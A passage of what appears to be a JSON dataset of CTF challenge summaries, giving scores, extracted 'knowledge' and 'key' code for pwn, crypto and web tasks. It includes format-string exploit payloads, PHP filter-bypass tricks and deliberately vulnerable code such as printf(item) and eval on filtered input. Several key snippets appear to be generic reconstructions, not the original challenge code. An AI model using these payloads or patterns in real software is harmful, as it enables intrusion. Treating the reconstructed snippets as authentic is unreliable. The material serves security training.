unsigned __int64 v20; // [rsp+48h] [rbp-18h]\n\n v20 = __readfsqword(0x28u);  \n haystack[5] = 0;  \n for ( i = 0; i <= 4; ++i )  \n   haystack[i] = input[strlen(input) - 5 + i];  \n if ( !strstr(haystack, \"1337\") )              // 14:19  \n   goto LABEL_23; //must contain 1337, and be either X1337 or 1337X  \n v1 = strtol(haystack, 0LL, 10);  \n v2 = 100 * (input[13] - '0') + 1000 * (input[6] - '0') + input[15] - '0';  \n v3 = v1;  \n v4 = strlen(input);  \n v5 = strlen(input) * v4;  \n if ( v3 % (strlen(input) * v5) != v2 )  \n   goto LABEL_23;// 1337XorX1337 % len**3 must have ten digit being 0  \n for ( j = 0; j <= 4; ++j )  \n {  \n   v16[j] = input[j];  \n   v17[j] = input[strlen(input) - 10 + j];  \n }  \n v16[5] = 0;  \n v17[5] = 0;  \n for ( k = 0; k <= 14; ++k )  \n   v19[k] = input[k];  \n v19[14] = 0;  \n for ( l = 0; l <= 3; ++l )  \n   _1337[l] = haystack[l + 1];  \n _1337[4] = 0;  \n if ( strstr(v19, _1337)  \n   && (v6 = *input, v6 == input[strlen(input) - 8])// [0] == [11]  \n   && (v7 = input[strlen(input) - 2] - 48,  \n       v8 = input[strlen(input) - 3]  \n          - 48                                 // [17] + [16] + [15] + 1 == [1]  \n          + v7,  \n       v8 + input[strlen(input) - 4] - 48 + 1 == input[1] - 48)  \n   && (v9 = strlen(input), v9 == 19 * ((unsigned __int64)(0xD79435E50D79435FLL\n* (unsigned __int128)v9 >> 64) >> 4)) ) // len must == 19  \n {  \n   result = 1LL;  \n }  \n else  \n {  \nLABEL_23:  \n   result = 0xFFFFFFFFLL;  \n }  \n return result;  \n}  \n```"
    },
    {
        "name": "Prefix sums",
        "write_up": "dataset/raw/Prefix sums.md",
        "type": "This CTF challenge type is **crypto**.",
        "competition": [
            "ByteCTF/2020",
            "https://ctftime.org/event/1114/tasks/"
        ],
        "score": 290,
        "max_score": 375,
        "difficulty": 0.7733333333333333,
        "knowledge": [
            "When faced with combinatorial problems involving sequences or strings of elements (like parentheses, bits, or any binary state), the combination of mathematical formulas and programming can be used to count valid sequences. If a problem's condition is such that one type of element must always outnumber the other at any point in the sequence, solutions involving modified Catalan numbers or Catalan's triangle can be particularly effective. This methodology also applies to counting balanced sequences, such as parentheses or bracket sequences. In such a context, one can leverage the online encyclopedia of integer sequences (OEIS) to search for known sequences matching initial brute-force results, potentially leading to a closed formula.",
            "To optimize computations involving very large numbers, especially when dealing with ratios of combinatorial quantities, simplifying the expressions mathematically before programming them can be crucial. This approach is particularly useful when the numbers involved are too cumbersome for direct computation. For instance, in problems requiring the ratio of two combinatorial numbers as the answer, it may be possible to simplify the expression to a simpler form by applying combinatorial identities or properties, thereby avoiding direct computation of potentially massive numbers. Furthermore, the greatest common divisor (gcd) function can be used to reduce fractions to their simplest form before encoding them as part of a solution or flag.\n\nSample of payload for simplification process:\n\n```python\nfrom math import gcd\n\n# Assuming these values are derived from the problem's requirements\nn = 3141592653589793238\np = 101124131231734\n\n# Compute the simplified ratio as the answer\nnum = n - 2 * p\nden = n\ng = gcd(num, den)  # Simplifying the fraction\n\nnum //= g\nden //= g\n\n# Encoded or simplified form ready for further use\n```\n\nThis approach is universal for problems requiring the computation of ratios or probabilities involving combinatorial counts, especially in scenarios where direct calculation is impractical due to the scale of numbers."
        ],
        "key": "```python  \nfrom functools import lru_cache\n\n@lru_cache(None)  \ndef brute_force(tot_1, tot_0, prefix_sum):  \n   if tot_1 == 0 and tot_0 == 0:  \n       return 1\n\n   res = 0\n\n   if tot_1 > 0:  \n       res += brute_force(tot_1 - 1, tot_0, prefix_sum + 1)\n\n   if tot_0 > 0 and prefix_sum > 1:  \n       res += brute_force(tot_1, tot_0 - 1, prefix_sum - 1)\n\n   return res\n\nfor tot_1 in range(10):  \n   print(tot_1, end=\" : \")  \n   # The amount of 1s must be strictly greater  \n   # than the amount of 0s  \n   for tot_0 in range(tot_1):  \n       res = brute_force(tot_1, tot_0, 0)  \n       print(res, end=\" \")  \n   print()  \n```"
    },
    {
        "name": "Prejudiced Randomness 1",
        "write_up": "dataset/raw/Prejudiced Randomness 1.md",
        "type": "crypto",
        "competition": [
            "CCCamp/2019",
            "https://ctftime.org/event/854/tasks/"
        ],
        "score": 123,
        "max_score": 500,
        "difficulty": 0.246,
        "knowledge": [
            "When tasked with finding the square root of a number modulo n, where n is a product of two prime numbers, utilizing specially prepared primes (of the form 4k + 3) simplifies the process. For such primes, the square roots are directly calculable using the formula `\u00b1 s**((p + 1) / 4)`. This approach is advantageous in scenarios where one has control over the selection of primes, allowing for an efficient solution to finding square roots in modular arithmetic problems.",
            "To defeat checks for primality, especially when a system uses the Miller-Rabin primality test with a limited set of bases for testing, crafting composite numbers that pass as primes is feasible. The key lies in selecting composite numbers that fail the Miller-Rabin test for all chosen bases. If a system or algorithm only tests bases up to a certain number (e.g., less than 314), it's possible to construct composite numbers that are identified as primes by this limited test. This technique can be exploited in challenges where bypassing primality checks is necessary to achieve a goal, particularly when the system or challenge uses a flawed or incomplete implementation of the Miller-Rabin test."
        ],
        "key": "```python\ndef is_prime(n, rounds):  \n   if n % 2 == 0:  \n       return False  \n   d, s = n - 1, 0  \n   while not d % 2:  \n       d, s = d >> 1, s + 1  \n   return not any(test(a, d, n, s) for a in R.sample(range(1,314), rounds))  \n```"
    },
    {
        "name": "primitive",
        "write_up": "dataset/raw/primitive.md",
        "type": "crypto",
        "competition": [
            "StarCTF/2018",
            "https://ctftime.org/event/614/tasks/"
        ],
        "score": 869,
        "max_score": 909,
        "difficulty": 0.9559955995599559,
        "knowledge": [
            "When facing a challenge involving a substitution cipher with a given permutation and a limited set of allowed operations (ADD, ROL, XOR), one effective approach is to first decompose the cipher into a series of swaps (transpositions) and then focus on finding operations that implement these swaps. This decomposition simplifies the complex problem into manageable parts, where one can first target operations that map two specific values to 0 and 1, perform a swap, and then map them back to their original positions using inverse operations. This method requires experimentation and possibly brute force to identify the specific sequence of operations for each swap.",
            "In challenges where brute-forcing all possible combinations of operations (e.g., ADD, ROL, XOR) is unfeasible due to the large search space, it's crucial to prioritize reducing the search space. This can be achieved by identifying patterns or restrictions in the possible operations that lead to a solution, such as limiting the form of operation sequences to a manageable pattern (e.g., `ADD a, ROL b, XOR c, ADD d`). Further optimizations may involve conducting initial tests on a reduced problem scale (e.g., smaller number of bits) to identify effective strategies or operation sequences that can likely apply to the full problem scale. This approach streamlines the search process, making it possible to calculate and store all potential solutions efficiently. \n\nExample payload for a swap operation could resemble the sequence provided for `swap(0, 1)`: `ADD 254, ROL 7, ADD 1, ROL 1`, although the specific sequence might vary based on the problem's constraints and the targeted numbers to swap."
        ],
        "key": "```python\nimport random\n\ndef generate_permutation():\n    perm = list(range(256))\n    random.shuffle(perm)\n    return perm\n\ndef apply_operations(c, operations):\n    for op, n in operations:\n        if op == 'ADD':\n            c = (c + n) % 256\n        elif op == 'ROL':\n            c = ((c << n) | (c >> (8 - n))) & 0xFF\n        elif op == 'XOR':\n            c = c ^ n\n    return c\n\ndef vulnerable_function():\n    perm = generate_permutation()\n    # Example of a vulnerable operation sequence\n    operations = [('ADD', 3), ('ROL', 1), ('XOR', 2)]\n    # Apply operations to each byte\n    result = [apply_operations(c, operations) for c in range(256)]\n    return result\n\n# This function is vulnerable because it relies on predictable operations\n# that can be reverse-engineered to deduce the permutation.\n```"
    },
    {
        "name": "printf",
        "write_up": "dataset/raw/printf.md",
        "type": "pwn",
        "competition": [
            "HXP/2020",
            "https://ctftime.org/event/1134/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "In a pwn challenge, when faced with a custom `printf` implementation lacking specific format specifiers (e.g., `%n`) but allowing for arbitrary format string vulnerabilities, an effective approach to exploit the challenge involves leveraging the functionality to leak stack variables to defeat ASLR. This method utilizes a controlled format string, such as `%lx|%lx|%lx|...`, to extract values from the stack, revealing addresses of variables, canaries, or libc pointers, which are crucial for crafting a successful exploit. This technique applies universally in scenarios where direct exploitation methods (e.g., writing to arbitrary addresses using `%n`) are unavailable or restricted by the challenge setup.\nExample of format string to leak addresses: `\"%lx|%lx|%lx|...`",
            "Exploitation of incorrect `alloca` behavior due to unchecked argument size can be approached by causing an intentional stack underflow, which, in combination with writable sections of libc or similar binaries, allows for control over function pointers (e.g., `FILE *` vtable entries) to gain arbitrary code execution. In scenarios where a binary's protections (e.g., relro) are weaker than expected, modifying the pointer to a one-gadget or system call within libc by overflow or underflow can achieve RCE (Remote Code Execution). This method is particularly effective in scenarios where direct code injection is impractical due to security mechanisms but control over program flow remains achievable through binary or libc vulnerabilities.\nExample payload segment to adjust stack and control flow: `%<large_number>d` and then writing `one_gadget` or similar RCE trigger address at calculated position."
        ],
        "key": "```c\nv27 = number_of_digits(&fmt_[i_fmt]);  \ni_fmt += v27;  \nv55.width = my_atoi(&fmt_[i_fmt]);  \n```"
    },
    {
        "name": "Prison Break",
        "write_up": "dataset/raw/Prison Break.md",
        "type": "This write-up corresponds to a **misc** (miscellaneous) challenge in the CTF competition.",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 119,
        "max_score": 500,
        "difficulty": 0.238,
        "knowledge": [
            "When faced with a challenge that involves applying multiple operations over a large dataset where performance is critical, it's beneficial to pre-process the dataset to remove unnecessary data and consolidate operations. This can be achieved by sorting the data based on an attribute, counting occurrences, and filtering out entries that will not affect the final result. Example commands for data pre-processing in a bash environment include using `sort -n -k 1` to sort numerically based on the first column, `uniq -c` to count and consolidate identical lines, and `grep -v ' 0'` to filter out lines that end with 0, which are considered unnecessary for further computation.",
            "For performance-sensitive tasks, especially those involving large-scale data manipulation and numerical computations, utilizing alternative Python interpreters such as PyPy can lead to significant execution speed improvements. This is because PyPy uses just-in-time (JIT) compilation, which can make Python code run faster after the initial compilation overhead. This approach is particularly useful in scenarios where the standard CPython interpreter's performance is a bottleneck. Transitioning to PyPy requires no changes in the Python code for the majority of applications, making it a straightforward option for performance optimization.\n\nSample Commands for Pre-Processing:\n```bash\n$ cat Given_File.txt | sort -n -k 1 | uniq -c | sed 's/^[ \\t]*//;s/[ \\t]*$//' | grep -v ' 0' > clean_file\n```\n\nNote: The specific payload for applying the aforementioned knowledge cannot be provided due to the nature of the operations."
        ],
        "key": "```python\nfile = open(\"clean_file\", 'r')  \nl = []  \nfor i in range(9000999):  \n   l.append(0)\n\nfor line in file:  \n   o,a,b,c = line.split(' ')  \n   value = (int(c) % 10) * int(o)  \n   if value == 0:  \n       continue  \n   for i in range(int(a), int(b)):  \n       l[i] += value\n\nf = []  \nf.append(0)  \nfor v in l:  \n   current = int(v) % 10  \n   if current != 0:  \n       f.append(int(v) % 10)\n\nfinal = 1  \nfor a in f:  \n   if a == 0:  \n       continue  \n   final = (a * final) % 999999937\n\nprint(\"Flag is : HackTM{\" + str(final) + \"}\")  \n```"
    },
    {
        "name": "Professor Plum's _br_ Ravenous Researcher",
        "write_up": "dataset/raw/Professor Plum's _br_ Ravenous Researcher.md",
        "type": "This is a web challenge.",
        "competition": [
            "TU/2018",
            "https://ctftime.org/event/650/tasks/"
        ],
        "score": -1.0,
        "max_score": 497,
        "difficulty": -1,
        "knowledge": [
            "When dealing with web applications that return generic failure messages upon user input, inspect cookies for potential fields that can be manipulated. These cookies might contain condition flags or locations that, when altered, could trigger different responses from the server. This method is particularly useful in scenarios where server responses change based on user session data stored in cookies.",
            "For challenges that draw on real-world themes or games, such as Cluedo in this case, the solution might involve using elements or terms directly related to the theme. Enumerating and testing these theme-related elements as inputs (in this instance, locations from the game) can lead to the discovery of hidden paths or triggers for specific outcomes within the application.\n\nExample payload for manipulating cookies: \n- Before: `Found_Boddy=0; Location=Kitchen`\n- After: `Found_Boddy=1; Location=Billiard Room`"
        ],
        "key": "```php\n<?php\n$location = $_COOKIE['Location'];\n$found_boddy = $_COOKIE['Found_Boddy'];\n\nif ($found_boddy == 1 && $location == \"Billiard Room\") {\n    echo \"You found Mr. Boddy!\";\n} else {\n    echo \"Nice try but he's not there. Maybe try somewhere else in the mansion?\";\n}\n?>\n```"
    },
    {
        "name": "ProgrammersHateProgramming 2",
        "write_up": "dataset/raw/ProgrammersHateProgramming 2.md",
        "type": "web",
        "competition": [
            "PBjar/2021",
            "https://ctftime.org/event/1430/tasks/"
        ],
        "score": 227,
        "max_score": 500,
        "difficulty": 0.454,
        "knowledge": [
            "In challenges involving filters that block certain keywords or functions, one can bypass these filters by using **nesting** or **concatenation techniques**. For instance, if a word like 'read' is filtered and thus prevents usage of the function `readfile()`, nesting or concatenation can be used to work around the filter. This approach relies on the filter only acting once, allowing the second occurrence of the filtered term to remain after the first instance is removed. In the case of nesting, creating a pattern like `rereadad` will collapse into `read` after the filter removes the inner 'read'. In the context of concatenation, strings can be joined using the PHP concatenation operator `.`, effectively bypassing the filter by constructing the intended function call from separate, non-filtered strings.",
            "Various alternative PHP functions can serve as workarounds in web challenges when common functions are filtered out. For XSS or remote code execution (RCE) challenges where direct usage of functions like `readfile()`, `system()`, or `exec()` are blocked, lesser-known PHP functions such as `passthru()` can be utilized. This is underpinned by the diversity in PHP\u2019s function library, which allows for multiple methods to achieve the same outcome, such as file read or command execution. This serves as a reminder to explore the wide array of PHP functions that can perform similar tasks, especially when facing restrictive filters."
        ],
        "key": "```php\n<?php\n$input = $_GET['input'];\n$filtered_input = str_replace('read', '', $input);\neval($filtered_input);\n?>\n```"
    },
    {
        "name": "Programming 03",
        "write_up": "dataset/raw/Programming 03.md",
        "type": "This CTF challenge falls under the category of **programming**.",
        "competition": [
            "WhiteHat/2020/Quals",
            "https://ctftime.org/event/942/tasks/"
        ],
        "score": 100,
        "max_score": 470,
        "difficulty": 0.2127659574468085,
        "knowledge": [
            "When testing logical equivalence of complex expressions in programming challenges, especially with multiple variables ranging from `True` or `False`, one can adopt a brute force approach by iterating through all possible combinations of the variables' values. This technique is effective in scenarios where the number of variables is manageable and their permutations are computable within reasonable time constraints. To implement this, one can generate a table of value combinations for each variable and iterate through these combinations, evaluating the logical equivalence of the given expressions for each set of values.",
            "The use of `eval()` to dynamically evaluate string representations of expressions in Python is a powerful tool but poses significant security risks, especially with inputs of unknown origin. This is because `eval()` will execute the string passed to it as Python code, which can lead to unintended code execution if the string contains malicious code. Therefore, when working with `eval()` in a context where security is a concern, it is crucial to implement safety measures such as manually validating inputs before evaluation or using alternative methods to evaluate expressions without executing them as code.\n\nExample of a safety measure before using `eval()`:\n```python\nprint(str1)\nprint(str2)\njunk = input('ok? ')\nif not junk.lower() == 'yes':\n    raise Exception(\"Evaluation aborted by user.\")\nresult = eval(expression)\n```"
        ],
        "key": "```python\ndef solver(str1,str2):  \n\tfinalstr = str1 + '==' + str2  \n\tresult = True  \n\ttab = [[0,1] if x in finalstr else [0] for x in ['A','B','C','D','E','F','G','H','I']]  \n\tfor A in tab[0]:  \n\t\tfor B in tab[1]:  \n\t\t\tfor C in tab[2]:  \n\t\t\t\tfor D in tab[3]:  \n\t\t\t\t\tfor E in tab[4]:  \n\t\t\t\t\t\tfor F in tab[5]:  \n\t\t\t\t\t\t\tfor G in tab[6]:  \n\t\t\t\t\t\t\t\tfor H in tab[7]:  \n\t\t\t\t\t\t\t\t\tfor I in tab[8]:  \n\t\t\t\t\t\t\t\t\t\tresult &= eval(finalstr.replace('*','&').replace('+','|').replace('A', str(A)).replace('B',str(B)).replace('C',str(C)).replace('D',str(D)).replace('E', str(E)).replace('F', str(F)).replace('G',str(G)).replace('H',str(H)).replace('I',str(I)))  \n\t\t\t\t\t\t\t\t\t\tif result is False:  \n\t\t\t\t\t\t\t\t\t\t\treturn result  \n\treturn result  \n```"
    },
    {
        "name": "Projective Signatures",
        "write_up": "dataset/raw/Projective Signatures.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "LedgerDonjon/2020",
            "https://ctftime.org/event/1173/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge involving the analysis of power consumption traces to extract information about cryptographic operations, one can utilize sliding average and convolution techniques to align the traces for consistent analysis across different datasets. This method allows for the detection of similar patterns within the data, even when the exact start points or lengths of the data segments of interest vary. By computing a sliding average and identifying consistent low-level patterns, traces can be aligned for further analysis.\n   - Python example for calculating and aligning based on sliding averages:\n     ```python\n     conv = np.convolve(leak, np.ones((N,))/N, mode='valid')\n     start = np.where(conv < 50)[0][0]\n     leak = np.roll(leak, -start)\n     while leak[N]<70.0:\n        leak = np.roll(leak, -1)\n     leak = np.roll(leak, -50)\n     ```",
            "The extraction of bits from cryptographic operations executed in embedded systems can be achieved by analyzing conversion patterns in power consumption traces and applying mathematical relations derived from the algorithms in use. This involves mapping observed patterns to known algorithms, reversing the execution of these algorithms, and consequently deducing the operands involved in the computations, such as private keys or nonces.\n   - An implementation snippet for inversing based on traced patterns, assuming the use of the Extended Binary GCD algorithm for inversion:\n     ```python\n     def inv_gcd_from_trace(trace, m):  \n        a = 0  \n        b = 1  \n        for ch in trace[::-1]:  \n            if ch == \"A\":  \n                a = (a * 2) + b  \n                a, b = b, a  \n            elif ch == \"B\":  \n                a = (a * 2) + b  \n            elif ch == \"C\":  \n                a *= 2  \n            else:  \n                assert False  \n        return a\n     ```"
        ],
        "key": "```python\ndef inv_gcd_from_trace(trace, m):  \n   a = 0  \n   b = 1  \n   for ch in trace[::-1]:  \n       if ch == \"A\":  \n           a = (a * 2) + b  \n           a, b = b, a  \n       elif ch == \"B\":  \n           a = (a * 2) + b  \n       elif ch == \"C\":  \n           a *= 2  \n       else:  \n           assert False  \n   return a  \n```"
    },
    {
        "name": "PRSA",
        "write_up": "dataset/raw/PRSA.md",
        "type": "crypto",
        "competition": [
            "BackdoorCTF/2023",
            "https://ctftime.org/event/2153/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When faced with an encryption scheme using polynomials over a Galois Field \\(GF(2)\\) in a CTF challenge, and the ciphertext, \\(e\\), and \\(n = p \\times q\\) (where \\(p\\) and \\(q\\) are irreducible polynomials) are given, one can decrypt the original message by taking the square root (quadratic residue) of the encrypted polynomial \\(256\\) times, first in mod \\(p\\) then in mod \\(q\\), and finally combine the results using the Chinese Remainder Theorem (CRT). This method specifically works due to the encryption exponent being a power of two, \\(e = 2^{256}\\), simplifying decryption to repeated application of the square root in the field.",
            "For polynomial factorization, especially in cryptography CTF challenges where polynomials over a finite field are involved, SageMath is a powerful tool due to its built-in functions for polynomial operations and its support for various algebraic structures, such as Galois Fields and quotient rings. This simplifies the decryption process in challenges involving polynomial arithmetic by providing functions for root finding, polynomial arithmetic, and the application of mathematical theorems like the Chinese Remainder Theorem.\n\nSample of part of a SageMath payload based on extraction:\n```python\n# Assuming c, e, p*q (polynomial n) are given, and SageMath is used for calculations\np, q = factor(n)  # Factorize n to find polynomials p, q\np, q = p[0], q[0]\n# Working in the fields defined by p and q\nRp.<Y> = GF(2^p.degree(), modulus=p)\n...\nsol = crt([r1, r2], [p, q])  # Combine using CRT\n...\nmsg = long_to_bytes(int(''.join(coeff[::-1]), 2))  # Convert polynomial coefficients back to bytes\n```"
        ],
        "key": "```python\nfrom sage.all import *  \nfrom Crypto.Util.number import bytes_to_long, getPrime\n\nimport random  \nimport time  \nrandom.seed(time.time())\n\nmessage = b'flag{REDACTED}' ## the flag has been removed  \nF.<x> = PolynomialRing(GF(2), x)\n\np, q = [F.irreducible_element(random.randint(2 ** 10, 2 ** 12)) for _ in\nrange(2)]  \nR.<y> = F.quotient_ring(p * q)\n\nn = sum(int(bit) * y ** (len(bin(bytes_to_long(message))[2:]) - 1 - i) for i,\nbit in enumerate(bin(bytes_to_long(message))[2:]))\n\ne = 2 ** 256  \nc = n ** e\n\nprint(e) ## to be given to the user  \nprint(c) ## to be given to the user  \nprint(p * q) ## to be given to the user  \n```"
    },
    {
        "name": "Ps-Secure",
        "write_up": "dataset/raw/Ps-Secure.md",
        "type": "pwn",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 291,
        "max_score": 500,
        "difficulty": 0.582,
        "knowledge": [
            "When analyzing coredumps for software debugging or reverse engineering, look for instructions causing segmentation faults due to invalid memory access attempts (e.g., trying to write to a read-only text segment). This can provide insight into what operation failed and why, which is particularly useful for reconstructing the control flow or understanding the program's state at the time of the crash.",
            "In scenarios where a program uses Linear Congruential Generator (LCG) for randomness and the initial seed values are critical but lost or unknown, reverse engineering coupled with educated guessing can help recover those seeds. This involves:\n   - Identifying the usage context of the random values (e.g., offsets, function behavior).\n   - Recovering the last known state from memory.\n   - Calculating backwards to find the initial seed.\nThis approach is generally applicable in situations where randomness influences the control flow or output of a program and the seed values can be correlated with observable program behavior or output."
        ],
        "key": "```c\nvoid main(int argc, char **argv)  \n{  \n   char *func_ptr;  \n   int i, j;  \n   char filename[32];  \n   int num1 = 0;  \n   int num2 = 0;\n\n   printf(\"Thanks for choosing Ps Security\\n\");  \n   if ( argc <= 4 )  \n   {  \n       printf(\"Not enough parameters\\n\");  \n       exit(1);  \n   }  \n   if ( strlen(argv[4]) > 0x1F )  \n   {  \n       printf(\"Filename too long\\n\");  \n       exit(1);  \n   }  \n   num1 = atoi(argv[1]);  \n   num2 = atoi(argv[2]);  \n   for (i = 0; i < strlen(argv[1]); ++i)  \n       argv[1][i] = 'x';  \n   for (j = 0; j < strlen(argv[2]); ++j)  \n       argv[2][j] = 'x';  \n   sub_B3B(argv[3], &num1, &num2);  \n   sub_E51(&num1, (unsigned int *)&num2);  \n   strcpy(filename, argv[4]);  \n   strcat(filename, \".tXt\");  \n   func_ptr = (char *)sub_E51 + (signed int)rand_((unsigned int *)&num1) % 65 + 0x1C;  \n   printf(\"Hold your breath..\\n\");  \n  \n   ((void (__fastcall *)(char *, int *, int *))func_ptr)(filename, &num1, &num2);  \n}\n\nint64_t sub_E51(int *num1, unsigned int *num2)  \n{  \n   sub_B0A(num2);  \n   sub_BD2(num1, num2);  \n}\n```"
    },
    {
        "name": "Purchases",
        "write_up": "dataset/raw/Purchases.md",
        "type": "pwn",
        "competition": [
            "angstrom/2019",
            "https://ctftime.org/event/774/tasks/"
        ],
        "score": 120,
        "max_score": 250,
        "difficulty": 0.48,
        "knowledge": [
            "In challenges involving a Format String vulnerability, exploiting the vulnerability can be initiated by identifying an insecure `printf` call with a user-controlled format string. This can be exploited by first determining the offset at which the user input appears in the stack, allowing for arbitrary memory addresses to be read or written. This is crucial for overwriting function pointers or variables to hijack the flow of execution. Example payload to find the offset: 'AAAAAAAA%p%p%p%p%p%p%p%p' and looking for '41414141' in the output.",
            "After determining the correct offset, a Format String exploit can be performed to write specific values to arbitrary memory addresses. This can be particularly useful for overwriting GOT entries or function pointers to redirect execution to custom code or a desired function. In scenarios where direct writing is infeasible due to size constraints or the risk of introducing null bytes, the payload can leverage the `%n` specifier to write the number of bytes printed so far into a memory address. This requires crafting a payload that prints a controlled amount of characters before using `%n` to perform the write operation. Example for a write operation payload when trying to overwrite a function pointer with an address `0x080484b6`: `'%48879c%12$hn'` where `48879` represents the number of characters to print to match the lower bytes of the desired address, and `12` is the offset where the target memory address is placed on the stack, adjusted based on prior reconnaissance."
        ],
        "key": "```c\n#include <stdlib.h>  \n#include <stdio.h>  \n#include <string.h>\n\nvoid flag() {  \n\tsystem(\"/bin/cat flag.txt\");  \n}\n\nint main() {  \n\tgid_t gid = getegid();  \n\tsetresgid(gid, gid, gid);  \n\tsetvbuf(stdin, NULL, _IONBF, 0);  \n\tsetvbuf(stdout, NULL, _IONBF, 0);\n\n\tchar item[60];  \n\tprintf(\"What item would you like to purchase? \");  \n\tfgets(item, sizeof(item), stdin);  \n\titem[strlen(item)-1] = 0;\n\n\tif (strcmp(item, \"nothing\") == 0) {  \n\t\tprintf(\"Then why did you even come here? \");  \n\t} else {  \n\t\tprintf(\"You don't have any money to buy \");  \n\t\tprintf(item);  \n\t\tprintf(\"s. You're wasting your time! We don't even sell \");  \n\t\tprintf(item);  \n\t\tprintf(\"s. Leave this place and buy \");  \n\t\tprintf(item);  \n\t\tprintf(\" somewhere else. \");  \n\t}\n\n\tprintf(\"Get out!\\n\");  \n\treturn 0;  \n}  \n```"
    },
    {
        "name": "PW API Stage 1",
        "write_up": "dataset/raw/PW API Stage 1.md",
        "type": "misc",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 75,
        "max_score": 792,
        "difficulty": 0.0946969696969697,
        "knowledge": [
            "When analyzing database dumps and encountering tables with content in a hexadecimal format, one effective approach for extracting useful information is to decode the hexadecimal content. This is particularly applicable for tables named in a way that suggests they contain supplementary data, such as attachments, files, or blobs. Converting the hexadecimal data to its binary format may reveal embedded files such as images, documents, or executable files which can contain hidden messages or clues.\n\n   - Example Python snippet for converting hexadecimal data to binary files:\n     ```python\n     from binascii import unhexlify\n\n     with open('input.txt', 'r') as fd:\n         for line in fd:\n             index = line.split(\"(\")[1].split(\",\")[0]\n             hex_str = line.split(\" \")[2].split(\")\")[0].split(\"x\")[1]\n\n             result = unhexlify(hex_str)\n             with open('files/file_' + index, 'wb') as new_file:\n                 new_file.write(result)\n     ```",
            "When faced with a large set of data files (e.g., images, documents) obtained from a CTF challenge, and the goal is to identify hidden flags or clues, conduct a manual review of each file, especially those that appear to be outliers in terms of content or formatting. This is based on the fact that challenge designers often embed flags or hints in files that deviate from the majority in some noticeable manner, such as an image that is not consistent with the others in a collection of memes."
        ],
        "key": "```sql\nCREATE TABLE `attachments` (\n  `id` int(11) NOT NULL,\n  `ticket_id` int(11) DEFAULT NULL,\n  `attachment` longblob\n);\n\nINSERT INTO `attachments` VALUES \n(1, 101, 0x89504e470d0a1a0a0000000d4948445200000100000001000802000000f4e1cfa00000000467414d410000b18f0bfc6105000000097048597300000ec300000ec301c76fa8640000001974455874536f6674776172650041646f626520496d616765526561647971c9653c0000001c49444154789c6360f8cf000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    },
    {
        "name": "PW API",
        "write_up": "dataset/raw/PW API.md",
        "type": "crypto",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 792,
        "max_score": 792,
        "difficulty": 1.0,
        "knowledge": [
            "When facing applications using non-cryptographically secure pseudo-random number generators (PRNGs) like `java.util.Random` for sensitive tasks such as key generation, it's feasible to reverse-engineer the PRNG's output or state if a segment of the output (e.g., an API key or token) is known. This is especially true when the PRNG is not securely seeded (e.g., with predictable or known values). Utilizing weaknesses in the PRNG implementation, such as linear congruential generators (LCGs) which exhibit predictable behavior, can enable an attacker to reconstruct the initial seed or subsequent PRNG outputs. This approach requires understanding of the PRNG's internal workings, including its state transition function, output function, and how seeds are initialized.",
            "Meet-in-the-middle attacks can be applied to mathematical problems with linear or near-linear properties, such as reversing LCG states used in insecure key generation processes. For this technique, one typically divides the problem into two smaller problems, solves each independently, and then combines the solutions to solve the original problem. In the context of reversing PRNG sequences, this could involve brute-forcing a portion of the seed space based on known output properties (e.g., even or odd indices of characters in an API key) and then iteratively applying the PRNG's inverse state transition function to identify previous states leading to the known output. This method can drastically reduce the computational effort required compared to brute-forcing the entire seed space, making it practical to recover full seeds or output sequences from partial information.\n\nSample payload or code specific to reversing the seed of a non-cryptographically secure PRNG (specifically `java.util.Random` used in this context) is not directly provided due to the generic nature of the extracted knowledge. However, the concept of applying meet-in-the-middle attacks involves sequentially or concurrently testing possible seed fragments against known output characteristics (e.g., parity or specific character positions in a generated string) to identify matching seed candidates, which can then be used to predict or regenerate PRNG outputs."
        ],
        "key": "```java\nimport org.apache.commons.lang3.RandomStringUtils;\n\npublic ApiKey createKey(String pw)  \n{  \n String apiKey = \"\";  \n boolean activated = false;  \n if(pw.equals(instancePw))  \n {  \n     apiKey = RandomStringUtils.random(100, \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\");  \n     activated = true;  \n     pws.put(apiKey, new ArrayList());  \n }  \n return new ApiKey(apiKey, activated);  \n}\n```"
    },
    {
        "name": "Pwn Chall",
        "write_up": "dataset/raw/Pwn Chall.md",
        "type": "crypto",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
